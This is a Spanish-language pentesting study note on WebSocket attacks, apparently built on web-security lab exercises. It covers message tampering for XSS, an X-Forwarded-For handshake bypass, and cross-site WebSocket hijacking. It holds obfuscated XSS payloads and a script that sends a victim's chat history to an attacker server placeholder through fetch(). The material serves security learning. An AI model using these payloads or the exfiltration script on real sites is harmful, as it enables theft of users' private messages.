# WebSockets Attacks

## Table of contents

- [WebSockets Attacks](#websockets-attacks)
  - [INTRODUCCION](#introduccion)
  - [¿Cuál es la diferencia entre HTTP y WebSockets?](#cul-es-la-diferencia-entre-http-y-websockets)
  - [USO](#uso)
  - [VULNERABILIDADES](#vulnerabilidades)
    - [MANIPULACION DE MENSAJES (XSS exploit)](#manipulacion-de-mensajes-xss-exploit)
    - [Manipulating the WebSocket handshake (XSS exploit)](#manipulating-the-websocket-handshake-xss-exploit)
    - [Cross-site WebSocket hijacking](#cross-site-websocket-hijacking)

## INTRODUCCION

[Los WebSockets](https://portswigger.net/web-security/websockets) son un protocolo de comunicaciones full dúplex bidireccional que se inicia a través de HTTP. Se usan comúnmente en aplicaciones web modernas para transmitir datos y otro tráfico asíncrono.

## ¿Cuál es la diferencia entre HTTP y WebSockets?

La mayoría de las comunicaciones entre los navegadores web y los sitios web utilizan HTTP. Con HTTP, el cliente envía una solicitud y el servidor devuelve una respuesta. Normalmente, la respuesta se produce inmediatamente y la transacción se completa. Incluso si la conexión de red permanece abierta, se usará para una transacción separada de una solicitud y una respuesta.

Algunos sitios web modernos usan WebSockets. Las conexiones de WebSocket se inician a través de HTTP y, por lo general, son de larga duración. Los mensajes se pueden enviar en cualquier dirección en cualquier momento y no son de naturaleza transaccional. La conexión normalmente permanecerá abierta e inactiva hasta que el cliente o el servidor estén listos para enviar un mensaje.

Por ejemplo, el uso de los chats de whatsapp hace uso de websockets ya un canal se queda a la escuhca de nuevos mensajes que te llegan para luego notificarte.

## USO

Los WebSockets se utilizan ampliamente en las aplicaciones web modernas. Se inician a través de HTTP y proporcionan conexiones de larga duración con comunicación asíncrona en ambas direcciones.

Los WebSockets se utilizan para todo tipo de propósitos, incluida la realización de acciones de usuario y la transmisión de información confidencial. Prácticamente cualquier vulnerabilidad de seguridad web que surja con HTTP normal también puede surgir en relación con las comunicaciones de WebSockets.

## VULNERABILIDADES

Al igual que una pagina web basada en HTTP, los websockets pueden ser vulnerables a la mayoria de ataques web conocidos tanto de frontend como de backend.

![[Pasted image 20230206221250.png]]

### MANIPULACION DE MENSAJES (XSS exploit)

Al igual que cualquier otra peticion, podemos interceptar las peticiones de web sockets, por ejemplo de un chat:

![[Pasted image 20230206223243.png]]

![[Pasted image 20230206223306.png]]

podemos editar el mensaje para probar cualquier tipo de ataque (XSS, SQLi, SSRF, LFI, etc), vamos aprobar XSS:

![[Pasted image 20230206223440.png]]

le damos a forward, como el chat se refleja en pantalla se nos muestra el payload:

![[Pasted image 20230206223920.png]]

>[!tip]
>Si se tarda mucho en el intercept puede que el websocket se pare un momento y no cargue el payload, por lo que al interceptar se tiene que colocar el payload rapidamente y darle forward.

### Manipulating the WebSocket handshake (XSS exploit)

Podemos ver el historial de comunicacion en la opcion **WebSockets History**:

![[Pasted image 20230206225012.png]]

damos click derecho y podemos mandarlo al repeater, la diferencia con una web normal es que aqui priumero intentara conectarse con el servidor para establecer el websocket:

![[Pasted image 20230206225209.png]]

en este caso no se puede establecer comunicacion y vemos un mensaje en la respuesta:

![[Pasted image 20230206225243.png]]

podemos intentar evadir esto colocando el header `X-Forwarded-For`:

![[Pasted image 20230206225554.png]]

>[!tip]
>Podemos colocar cualquier valor u otra IP en caso de que falle (127.0.0.1, 255.255.255.0, 127.0.0.2, etc)

ya una vez conectados podemos probar cualquier mensaje:

![[Pasted image 20230206225859.png]]

ahora podemos enviar un payload XSS para evadir protecciones:

```html
<img src=1 oNeRrOr=alert`1`>
```

o este 0day:

```javascript
"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
```

### Cross-site WebSocket hijacking

Implica una vulnerabilidad de falsificación de solicitud entre sitios (CSRF) en un protocolo de enlace de WebSocket . Surge cuando la solicitud de protocolo de enlace de WebSocket se basa únicamente en las cookies HTTP para el manejo de la sesión y no contiene tokens CSRF u otros valores impredecibles.

**EJEMPLO**

Al enviar el comando **READY** al websocket server recupera los mensajes de chat anteriores del servidor.

![[Pasted image 20230206233646.png]]

como la peticion de ver el chat no tiene un token CSRF:

![[Pasted image 20230206233802.png]]

podemos crear un script que realice la peticion al servidor websocket y mande el comando **READY** y cada resultado del chat exfiltrarlo por un parametro GET a nuestro servidor de atacante, creamos el siguiente script:

```javascript
<script>
    var ws = new WebSocket('wss://<WEBSOCKET-SERVER>');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://<ATTACKER-SERVER>', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

**WEBSOCKET-SERVER:**

![[Pasted image 20230206234104.png]]

**ATTACKER-SERVER:**

![[Pasted image 20230206234137.png]]

mandamos a la victima y cuando abra nuestro exploit recuperaremos sus otros chats privados:

![[Pasted image 20230206234333.png]]